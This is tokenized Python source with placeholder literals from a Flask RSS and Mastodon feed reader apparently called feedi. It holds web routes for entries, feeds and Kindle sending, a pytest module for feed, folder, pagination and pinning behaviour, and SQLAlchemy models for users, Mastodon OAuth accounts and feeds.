<EOL> try : <EOL> entry = models . Entry . from_url ( current_user . id , url ) <EOL> except Exception : <EOL> if redirect : <EOL> return redirect_response ( url ) <EOL> else : <EOL> return '<STR_LIT>' , <NUM_LIT> <EOL> db . session . add ( entry ) <EOL> db . session . commit ( ) <EOL> if redirect : <EOL> return redirect_response ( flask . url_for ( '<STR_LIT>' , id = entry . id ) ) <EOL> else : <EOL> return '<STR_LIT>' , <NUM_LIT> <EOL> @ app . post ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def entry_unwrap ( id ) : <EOL> "<STR_LIT>" <EOL> entry = db . get_or_404 ( models . Entry , id ) <EOL> if entry . user_id != current_user . id : <EOL> flask . abort ( <NUM_LIT> ) <EOL> if entry . content_short : <EOL> for link in entry . embedded_links ( ) : <EOL> try : <EOL> subentry = models . Entry . from_url ( current_user . id , link ) <EOL> entry . viewed = datetime . datetime . now ( ) <EOL> db . session . add ( subentry ) <EOL> db . session . commit ( ) <EOL> return flask . render_template ( '<STR_LIT>' , <EOL> entries = [ subentry ] ) <EOL> except Exception : <EOL> continue <EOL> return "<STR_LIT>" , <NUM_LIT> <EOL> @ app . get ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def entry_view ( id ) : <EOL> entry = db . get_or_404 ( models . Entry , id ) <EOL> if entry . user_id != current_user . id : <EOL> flask . abort ( <NUM_LIT> ) <EOL> if '<STR_LIT>' in flask . request . headers and '<STR_LIT>' not in flask . request . args and not entry . content_full : <EOL> return flask . render_template ( "<STR_LIT>" , entry = entry , content = None ) <EOL> else : <EOL> if not entry . content_url and not entry . target_url : <EOL> return "<STR_LIT>" , <NUM_LIT> <EOL> if '<STR_LIT>' in entry . content_url or '<STR_LIT>' in entry . content_url : <EOL> return redirect_response ( entry . target_url ) <EOL> entry . fetch_content ( ) <EOL> if entry . content_full : <EOL> entry . viewed = entry . viewed or datetime . datetime . utcnow ( ) <EOL> db . session . commit ( ) <EOL> return flask . render_template ( "<STR_LIT>" , entry = entry , content = entry . content_full ) <EOL> return redirect_response ( entry . target_url ) <EOL> def redirect_response ( url ) : <EOL> if '<STR_LIT>' in flask . request . headers : <EOL> response = flask . make_response ( ) <EOL> response . headers [ '<STR_LIT>' ] = url <EOL> return response <EOL> else : <EOL> return flask . redirect ( url ) <EOL> @ app . post ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def send_to_kindle ( ) : <EOL> if not current_user . has_kindle : <EOL> return '<STR_LIT>' , <NUM_LIT> <EOL> kindle = db . session . scalar ( db . select ( models . KindleDevice ) . filter_by ( <EOL> user_id = current_user . id ) ) <EOL> url = flask . request . args [ '<STR_LIT>' ] <EOL> article = scraping . extract ( url ) <EOL> with tempfile . NamedTemporaryFile ( mode = '<STR_LIT>' , delete = False ) as fp : <EOL> scraping . compress ( fp . name , article ) <EOL> kindle . send ( pathlib . Path ( fp . name ) , <EOL> author = article [ '<STR_LIT>' ] , <EOL> title = article [ '<STR_LIT>' ] ) <EOL> return '<STR_LIT>' , <NUM_LIT> <EOL> @ app . route ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def raw_feed ( feed_name ) : <EOL> feed = db . session . scalar ( <EOL> db . select ( models . Feed ) <EOL> . filter_by ( name = feed_name , user_id = current_user . id ) <EOL> . options ( sa . orm . undefer ( models . Feed . raw_data ) ) <EOL> ) <EOL> if not feed : <EOL> flask . abort ( <NUM_LIT> , "<STR_LIT>" ) <EOL> return app . response_class ( <EOL> response = feed . raw_data , <EOL> status = <NUM_LIT> , <EOL> mimetype = '<STR_LIT>' <EOL> ) <EOL> @ app . route ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def raw_entry ( id ) : <EOL> entry = db . get_or_404 ( models . Entry , id , <EOL> options = [ sa . orm . undefer ( models . Entry . raw_data ) ] ) <EOL> if entry . user_id != current_user . id : <EOL> flask . abort ( <NUM_LIT> ) <EOL> return app . response_class ( <EOL> response = entry . raw_data , <EOL> status = <NUM_LIT> , <EOL> mimetype = '<STR_LIT>' <EOL> ) <EOL> @ app . put ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def update_setting ( setting , value ) : <EOL> flask . session [ setting ] = value <EOL> return '<STR_LIT>' , <NUM_LIT> <EOL> @ app . post ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def toggle_setting ( setting ) : <EOL> flask . session [ setting ] = not flask . session . get ( setting , True ) <EOL> return '<STR_LIT>' , <NUM_LIT> <EOL> @ app . context_processor <EOL> def sidebar_feeds ( ) : <EOL> if current_user . is_authenticated : <EOL> folders = db . session . scalars ( db . select ( models . Feed . folder ) <EOL> . filter_by ( user_id = current_user . id ) <EOL> . filter ( models . Feed . folder . isnot ( None ) , <EOL> models . Feed . folder . isnot ( '<STR_LIT>' ) ) <EOL> . group_by ( models . Feed . folder ) <EOL> . order_by ( sa . func . count ( models . Feed . folder ) . desc ( ) ) ) . all ( ) <EOL> return dict ( shortcut_folders = folders , filters = { } ) <EOL> return { } <EOL> </s>
<s> import datetime as dt <EOL> import re <EOL> from tests . conftest import ( create_feed , extract_entry_ids , mock_feed , <EOL> mock_request ) <EOL> def test_feed_add ( client ) : <EOL> feed_domain = '<STR_LIT>' <EOL> response = create_feed ( client , feed_domain , [ { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } , <EOL> { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } ] ) <EOL> assert response . status_code == <NUM_LIT> <EOL> assert response . request . path == f'<STR_LIT>' , '<STR_LIT>' <EOL> assert '<STR_LIT>' in response . text , '<STR_LIT>' <EOL> assert '<STR_LIT>' in response . text , '<STR_LIT>' <EOL> assert response . text . find ( <EOL> '<STR_LIT>' ) < response . text . find ( '<STR_LIT>' ) , '<STR_LIT>' <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert response . status_code == <NUM_LIT> <EOL> assert '<STR_LIT>' in response . text , '<STR_LIT>' <EOL> assert '<STR_LIT>' in response . text , '<STR_LIT>' <EOL> assert response . text . find ( <EOL> '<STR_LIT>' ) < response . text . find ( '<STR_LIT>' ) , '<STR_LIT>' <EOL> def test_folders ( client ) : <EOL> create_feed ( client , '<STR_LIT>' , [ { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } , <EOL> { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } ] , <EOL> folder = '<STR_LIT>' ) <EOL> create_feed ( client , '<STR_LIT>' , [ { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } , <EOL> { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } ] , <EOL> folder = '<STR_LIT>' ) <EOL> create_feed ( client , '<STR_LIT>' , [ { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } , <EOL> { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } ] , <EOL> folder = '<STR_LIT>' ) <EOL> create_feed ( client , '<STR_LIT>' , [ { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } , <EOL> { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } ] ) <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert all ( [ feed in response . text for feed in [ '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] ] ) <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert all ( [ feed in response . text for feed in [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] ] ) <EOL> assert all ( [ feed not in response . text for feed in [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] ] ) <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert all ( [ feed in response . text for feed in [ '<STR_LIT>' , '<STR_LIT>' ] ] ) <EOL> assert all ( [ feed not in response . text for feed in [ <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] ] ) <EOL> def test_home_sorting ( client ) : <EOL> date12h = dt . datetime . now ( dt . timezone . utc ) - dt . timedelta ( hours = <NUM_LIT> ) <EOL> create_feed ( client , '<STR_LIT>' , [ { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : date12h } ] ) <EOL> items = [ ] <EOL> for i in range ( <NUM_LIT> , <NUM_LIT> ) : <EOL> items . append ( { '<STR_LIT>' : f'<STR_LIT>' , '<STR_LIT>' : date12h + dt . timedelta ( hours = <NUM_LIT> , minutes = i ) } ) <EOL> create_feed ( client , '<STR_LIT>' , items ) <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert response . text . find ( '<STR_LIT>' ) < response . text . find ( '<STR_LIT>' ) <EOL> assert response . text . find ( '<STR_LIT>' ) < response . text . find ( '<STR_LIT>' ) <EOL> date13h = date12h - dt . timedelta ( hours = <NUM_LIT> ) <EOL> create_feed ( client , '<STR_LIT>' , [ { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : date13h } ] ) <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert response . text . find ( '<STR_LIT>' ) < response . text . find ( '<STR_LIT>' ) <EOL> assert response . text . find ( '<STR_LIT>' ) < response . text . find ( '<STR_LIT>' ) <EOL> client . put ( '<STR_LIT>' ) <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert response . text . find ( '<STR_LIT>' ) < response . text . find ( '<STR_LIT>' ) <EOL> assert '<STR_LIT>' not in response . text <EOL> assert '<STR_LIT>' not in response . text <EOL> def test_home_pagination ( app , client ) : <EOL> now = dt . datetime . now ( dt . timezone . utc ) <EOL> items = [ ] <EOL> per_page = app . config [ '<STR_LIT>' ] <EOL> for i in range ( <NUM_LIT> , per_page * <NUM_LIT> ) : <EOL> items . append ( { '<STR_LIT>' : f'<STR_LIT>' , '<STR_LIT>' : now - dt . timedelta ( hours = <NUM_LIT> , minutes = i ) } ) <EOL> create_feed ( client , '<STR_LIT>' , items ) <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert '<STR_LIT>' in response . text <EOL> assert f'<STR_LIT>' in response . text <EOL> assert f'<STR_LIT>' not in response . text <EOL> assert response . text . find ( '<STR_LIT>' ) < response . text . find ( f'<STR_LIT>' ) <EOL> next_page = re . search ( r'<STR_LIT>' , response . text ) . group ( <NUM_LIT> ) <EOL> response = client . get ( f'<STR_LIT>' ) <EOL> assert f'<STR_LIT>' not in response . text <EOL> assert f'<STR_LIT>' in response . text <EOL> assert f'<STR_LIT>' in response . text <EOL> assert f'<STR_LIT>' not in response . text <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert f'<STR_LIT>' not in response . text <EOL> assert f'<STR_LIT>' in response . text <EOL> assert f'<STR_LIT>' in response . text <EOL> assert f'<STR_LIT>' not in response . text <EOL> response = client . post ( '<STR_LIT>' ) <EOL> assert response . status_code == <NUM_LIT> <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert '<STR_LIT>' in response . text <EOL> assert f'<STR_LIT>' in response . text <EOL> assert f'<STR_LIT>' not in response . text <EOL> def test_sync_old_entries ( client ) : <EOL> pass <EOL> def test_sync_updates ( client ) : <EOL> feed_domain = '<STR_LIT>' <EOL> response = create_feed ( client , feed_domain , [ { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' } , <EOL> { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } ] ) <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> mock_feed ( feed_domain , [ { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' } , <EOL> { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } , <EOL> { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } ] ) <EOL> response = client . post ( f'<STR_LIT>' ) <EOL> assert response . status_code == <NUM_LIT> <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' not in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> def test_sync_between_pages ( client ) : <EOL> pass <EOL> def test_favorites ( client ) : <EOL> feed_domain = '<STR_LIT>' <EOL> response = create_feed ( client , feed_domain , [ { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } , <EOL> { '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' } , <EOL> { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } ] ) <EOL> entry_ids = extract_entry_ids ( response ) <EOL> response = client . put ( f'<STR_LIT>' ) <EOL> assert response . status_code == <NUM_LIT> <EOL> response = client . put ( f'<STR_LIT>' ) <EOL> assert response . status_code == <NUM_LIT> <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert '<STR_LIT>' not in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> assert response . text . find ( '<STR_LIT>' ) < response . text . find ( '<STR_LIT>' ) <EOL> def test_backlog ( client ) : <EOL> feed_domain = '<STR_LIT>' <EOL> response = create_feed ( client , feed_domain , [ { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } , <EOL> { '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' } , <EOL> { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } ] ) <EOL> entry_ids = extract_entry_ids ( response ) <EOL> response = client . put ( f'<STR_LIT>' ) <EOL> assert response . status_code == <NUM_LIT> <EOL> response = client . put ( f'<STR_LIT>' ) <EOL> assert response . status_code == <NUM_LIT> <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert '<STR_LIT>' not in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' not in response . text <EOL> assert '<STR_LIT>' not in response . text <EOL> response = client . delete ( f'<STR_LIT>' ) <EOL> assert response . status_code == <NUM_LIT> <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert '<STR_LIT>' not in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' not in response . text <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' not in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> def test_pinned ( client ) : <EOL> response = create_feed ( client , '<STR_LIT>' , [ { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } , <EOL> { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } ] , <EOL> folder = '<STR_LIT>' ) <EOL> f1a2_pin_url = re . search ( r'<STR_LIT>' , response . text ) . group ( <NUM_LIT> ) <EOL> response = create_feed ( client , '<STR_LIT>' , [ { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } , <EOL> { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } ] ) <EOL> f2_a2_pin_url = re . search ( r'<STR_LIT>' , response . text ) . group ( <NUM_LIT> ) <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' not in response . text <EOL> now = dt . datetime . now ( dt . timezone . utc ) <EOL> for i in range ( <NUM_LIT> , <NUM_LIT> ) : <EOL> date = now - dt . timedelta ( hours = <NUM_LIT> , minutes = <NUM_LIT> ) <EOL> create_feed ( client , f'<STR_LIT>' , [ { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : date } ] , <EOL> folder = '<STR_LIT>' ) <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert '<STR_LIT>' not in response . text <EOL> assert '<STR_LIT>' not in response . text <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert '<STR_LIT>' not in response . text <EOL> response = client . put ( f1a2_pin_url ) <EOL> assert response . status_code == <NUM_LIT> <EOL> response = client . put ( f2_a2_pin_url ) <EOL> assert response . status_code == <NUM_LIT> <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' not in response . text <EOL> def test_entries_not_mixed_between_users ( client ) : <EOL> pass <EOL> def test_view_entry_content ( client ) : <EOL> with open ( '<STR_LIT>' ) as sample : <EOL> body = sample . read ( ) <EOL> response = create_feed ( client , '<STR_LIT>' , [ { '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : body } ] ) <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> entry_url = re . search ( r'<STR_LIT>' , response . text ) . group ( <NUM_LIT> ) <EOL> response = client . get ( entry_url ) <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> def test_add_external_entry ( client ) : <EOL> with open ( '<STR_LIT>' ) as sample : <EOL> body = sample . read ( ) <EOL> content_url = '<STR_LIT>' <EOL> mock_request ( content_url , body = body ) <EOL> response = client . post ( <EOL> '<STR_LIT>' , query_string = { '<STR_LIT>' : content_url , '<STR_LIT>' : <NUM_LIT> } , follow_redirects = True ) <EOL> assert response . status_code == <NUM_LIT> <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> previous_entry_url = response . request . path <EOL> response = client . post ( <EOL> '<STR_LIT>' , query_string = { '<STR_LIT>' : content_url , '<STR_LIT>' : <NUM_LIT> } , follow_redirects = True ) <EOL> assert response . status_code == <NUM_LIT> <EOL> assert response . request . path == previous_entry_url <EOL> client . post ( '<STR_LIT>' ) <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> def test_discover_feed ( client ) : <EOL> pass <EOL> def test_feed_list ( client ) : <EOL> pass <EOL> def test_feed_edit ( client ) : <EOL> pass <EOL> def test_feed_delete ( client ) : <EOL> response = create_feed ( client , '<STR_LIT>' , [ { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } , <EOL> { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } , <EOL> { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } ] ) <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> entry_ids = extract_entry_ids ( response ) <EOL> response = client . put ( '<STR_LIT>' + entry_ids [ <NUM_LIT> ] ) <EOL> assert response . status_code == <NUM_LIT> <EOL> response = client . put ( '<STR_LIT>' + entry_ids [ <NUM_LIT> ] ) <EOL> assert response . status_code == <NUM_LIT> <EOL> response = client . delete ( '<STR_LIT>' ) <EOL> assert response . status_code == <NUM_LIT> <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' in response . text <EOL> assert '<STR_LIT>' not in response . text <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert '<STR_LIT>' not in response . text <EOL> assert '<STR_LIT>' not in response . text <EOL> assert '<STR_LIT>' not in response . text <EOL> def test_mastodon_feed ( client ) : <EOL> pass <EOL> </s>
<s> import datetime <EOL> import json <EOL> import logging <EOL> import urllib <EOL> import sqlalchemy as sa <EOL> import sqlalchemy . dialects . sqlite as sqlite <EOL> import stkclient <EOL> import werkzeug . security as security <EOL> from flask_login import UserMixin <EOL> from flask_sqlalchemy import SQLAlchemy <EOL> from sqlalchemy . ext . hybrid import hybrid_property <EOL> import feedi . parsers as parsers <EOL> from feedi import scraping <EOL> db = SQLAlchemy ( ) <EOL> logger = logging . getLogger ( __name__ ) <EOL> def init_db ( app ) : <EOL> db . init_app ( app ) <EOL> @ sa . event . listens_for ( db . engine , '<STR_LIT>' ) <EOL> def on_connect ( dbapi_connection , _connection_record ) : <EOL> dbapi_connection . execute ( '<STR_LIT>' ) <EOL> dbapi_connection . execute ( '<STR_LIT>' ) <EOL> app . logger . debug ( "<STR_LIT>" ) <EOL> @ sa . event . listens_for ( User . __table__ , '<STR_LIT>' ) <EOL> def after_create ( user_table , connection , ** kw ) : <EOL> email = app . config . get ( '<STR_LIT>' ) <EOL> if email : <EOL> app . logger . info ( "<STR_LIT>" , email ) <EOL> stmt = sa . insert ( user_table ) . values ( <EOL> email = email , password = security . generate_password_hash ( '<STR_LIT>' ) ) <EOL> connection . execute ( stmt ) <EOL> db . create_all ( ) <EOL> class User ( UserMixin , db . Model ) : <EOL> __tablename__ = '<STR_LIT>' <EOL> id = sa . Column ( sa . Integer , primary_key = True ) <EOL> email = db . Column ( db . String ( <NUM_LIT> ) , unique = True , nullable = False ) <EOL> password = db . Column ( db . String ( <NUM_LIT> ) , nullable = False ) <EOL> mastodon_accounts = sa . orm . relationship ( "<STR_LIT>" , back_populates = '<STR_LIT>' ) <EOL> @ staticmethod <EOL> def hash_password ( raw_password ) : <EOL> return security . generate_password_hash ( raw_password ) <EOL> def set_password ( self , raw_password ) : <EOL> self . password = security . generate_password_hash ( raw_password ) <EOL> def check_password ( self , raw_password ) : <EOL> return security . check_password_hash ( self . password , raw_password ) <EOL> class MastodonApp ( db . Model ) : <EOL> __tablename__ = '<STR_LIT>' <EOL> id = sa . Column ( sa . Integer , primary_key = True ) <EOL> api_base_url = sa . Column ( sa . String , nullable = False ) <EOL> client_id = sa . Column ( sa . String , nullable = False ) <EOL> client_secret = sa . Column ( sa . String , nullable = False ) <EOL> accounts = sa . orm . relationship ( "<STR_LIT>" , back_populates = "<STR_LIT>" ) <EOL> @ classmethod <EOL> def get_or_create ( cls , api_base_url ) : <EOL> app = db . session . scalar ( db . select ( MastodonApp ) . filter_by ( api_base_url = api_base_url ) ) <EOL> if not app : <EOL> client_id , client_secret = parsers . mastodon . register_app ( <EOL> api_base_url , cls . _oauth_callback_url ( api_base_url ) ) <EOL> app = cls ( api_base_url = api_base_url , <EOL> client_id = client_id , <EOL> client_secret = client_secret ) <EOL> db . session . add ( app ) <EOL> db . session . commit ( ) <EOL> return app <EOL> def auth_redirect_url ( self ) : <EOL> return parsers . mastodon . auth_redirect_url ( self . api_base_url , <EOL> self . client_id , <EOL> self . client_secret , <EOL> self . _oauth_callback_url ( self . api_base_url ) ) <EOL> def create_account ( self , user_id , oauth_code ) : <EOL> "<STR_LIT>" <EOL> access_token = parsers . mastodon . oauth_login ( self . api_base_url , <EOL> self . client_id , <EOL> self . client_secret , <EOL> self . _oauth_callback_url ( self . api_base_url ) , <EOL> oauth_code ) <EOL> account_data = parsers . mastodon . fetch_account_data ( self . api_base_url , access_token ) <EOL> domain = self . api_base_url . split ( '<STR_LIT>' ) [ - <NUM_LIT> ] <EOL> username = f"<STR_LIT>" <EOL> masto_acct = MastodonAccount ( app_id = self . id , <EOL> user_id = user_id , <EOL> username = username , <EOL> access_token = access_token ) <EOL> db . session . add ( masto_acct ) <EOL> db . session . commit ( ) <EOL> return masto_acct <EOL> @ staticmethod <EOL> def _oauth_callback_url ( api_base_url ) : <EOL> import flask <EOL> return flask . url_for ( '<STR_LIT>' , <EOL> server = api_base_url , <EOL> _external = True ) <EOL> class MastodonAccount ( db . Model ) : <EOL> __tablename__ = '<STR_LIT>' <EOL> id = sa . Column ( sa . Integer , primary_key = True ) <EOL> app_id = sa . orm . mapped_column ( sa . ForeignKey ( "<STR_LIT>" ) , nullable = False ) <EOL> user_id = sa . orm . mapped_column ( sa . ForeignKey ( "<STR_LIT>" ) , nullable = False ) <EOL> access_token = sa . Column ( sa . String , nullable = False ) <EOL> username = sa . Column ( sa . String ) <EOL> app = sa . orm . relationship ( "<STR_LIT>" , lazy = '<STR_LIT>' ) <EOL> user = sa . orm . relationship ( "<STR_LIT>" , back_populates = '<STR_LIT>' ) <EOL> class KindleDevice ( db . Model ) : <EOL> __tablename__ = '<STR_LIT>' <EOL> id = sa . Column ( sa . Integer , primary_key = True ) <EOL> user_id = sa . orm . mapped_column ( sa . ForeignKey ( "<STR_LIT>" ) , nullable = False , unique = True ) <EOL> credentials = sa . Column ( sa . String , nullable = False ) <EOL> @ staticmethod <EOL> def signin_url ( ) : <EOL> auth = stkclient . OAuth2 ( ) <EOL> signin_url = auth . get_signin_url ( ) <EOL> return auth . _verifier , signin_url <EOL> @ classmethod <EOL> def add_from_url ( cls , user_id , verifier , redirect_url ) : <EOL> auth = stkclient . OAuth2 ( ) <EOL> auth . _verifier = verifier <EOL> client = auth . create_client ( redirect_url ) <EOL> values = dict ( user_id = user_id , credentials = client . dumps ( ) ) <EOL> db . session . execute ( <EOL> sqlite . insert ( cls ) . <EOL> values ( ** values ) . <EOL> on_conflict_do_update ( ( "<STR_LIT>" , ) , set_ = values ) <EOL> ) <EOL> def send ( self , path , author , title ) : <EOL> client = stkclient . Client . loads ( self . credentials ) <EOL> serials = [ d . device_serial_number for d in client . get_owned_devices ( ) ] <EOL> client . send_file ( path , serials , <EOL> format = '<STR_LIT>' , <EOL> author = author , <EOL> title = title ) <EOL> User . has_kindle = sa . orm . column_property ( sa . select ( sa . func . count ( KindleDevice . id ) == <NUM_LIT> ) <EOL> . where ( KindleDevice . user_id == User . id ) <EOL> . scalar_subquery ( ) ) <EOL> class Feed ( db . Model ) : <EOL> __tablename__ = '<STR_LIT>' <EOL> TYPE_RSS = '<STR_LIT>' <EOL> TYPE_MASTODON_HOME = '<STR_LIT>' <EOL> TYPE_MASTODON_NOTIFICATIONS = '<STR_LIT>' <EOL> TYPE_CUSTOM = '<STR_LIT>' <EOL> id = sa . Column ( sa . Integer , primary_key = True ) <EOL> user_id = sa . orm . mapped_column ( sa . ForeignKey ( "<STR_LIT>" ) , nullable = False , index = True ) <EOL> url = sa . Column ( sa . String ) <EOL> type = sa . Column ( sa . String , nullable = False ) <EOL> name = sa . Column ( sa . String ) <EOL> icon_url = sa . Column ( sa . String ) <EOL> created = sa . Column ( sa . TIMESTAMP , nullable = False , default = datetime . datetime . utcnow ) <EOL> updated = sa . Column ( sa . TIMESTAMP , nullable = False , <EOL> default = datetime . datetime . utcnow , onupdate = datetime . datetime . utcnow ) <EOL> last_fetch = sa . Column ( sa . TIMESTAMP ) <EOL> entries = sa . orm . relationship ( "<STR_LIT>" , back_populates = "<STR_LIT>" , <EOL> cascade = "<STR_LIT>" , lazy = '<STR_LIT>' ) <EOL> raw_data = sa . orm . deferred ( sa . Column ( sa . String , <EOL> doc = "<STR_LIT>" ) ) <EOL> folder = sa . Column ( sa . String , index = True ) <EOL> __mapper_args__ = { '<STR_LIT>' : type , <EOL> '<STR_LIT>' : '<STR_LIT>' } <EOL> __table_args__ = ( sa . UniqueConstraint ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> sa . Index ( "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) ) <EOL> def __repr__ ( self ) : <EOL> return f'<STR_LIT>' <EOL> @ classmethod <EOL> def resolve ( cls , type ) : <EOL> "<STR_LIT>" <EOL> subclasses = { <EOL> cls . TYPE_RSS : RssFeed , <EOL> cls . TYPE_MASTODON_HOME : MastodonHomeFeed , <EOL> cls . TYPE_MASTODON_NOTIFICATIONS : MastodonNotificationsFeed , <EOL> cls . TYPE_CUSTOM : CustomFeed <EOL> } <EOL> subcls = subclasses . get ( type ) <EOL> if not subcls : <EOL> raise ValueError ( f'<STR_LIT>' ) <EOL> return subcls <EOL> @ hybrid_property <EOL> def is_mastodon ( self ) : <EOL> return ( self . type == Feed . TYPE_MASTODON_HOME ) | ( self . type == Feed . TYPE_MASTODON_NOTIFICATIONS ) <EOL> @ classmethod <EOL> def from_valuelist ( cls , type , name , url , folder ) : <EOL> return cls ( ** dict ( type = type , name = name , url = url , folder = folder ) ) <EOL> def to_valuelist ( self ) : <EOL> return [ self . type , self . name , self . url , self . folder ] <EOL> def sync_with_remote ( self , force = False ) : <EOL> from flask import current_app as app <EOL> utcnow = datetime . datetime . utcnow ( ) <EOL> cooldown_minutes = datetime . timedelta ( minutes = app . config [ '<STR_LIT>' ] ) <EOL> if not force and self . last_fetch and ( utcnow - self . last_fetch < cooldown_minutes ) : <EOL> app . logger . info ( '<STR_LIT>' , self . name ) <EOL> return <EOL> entries = self . fetch_entry_data ( force ) <EOL> self . last_fetch = utcnow <EOL> for values in entries : <EOL> values [ '<STR_LIT>' ] = utcnow <EOL> values [ '<STR_LIT>' ] = self . id <EOL> values [ '<STR_LIT>' ] = self . user_id <EOL> db . session . execute 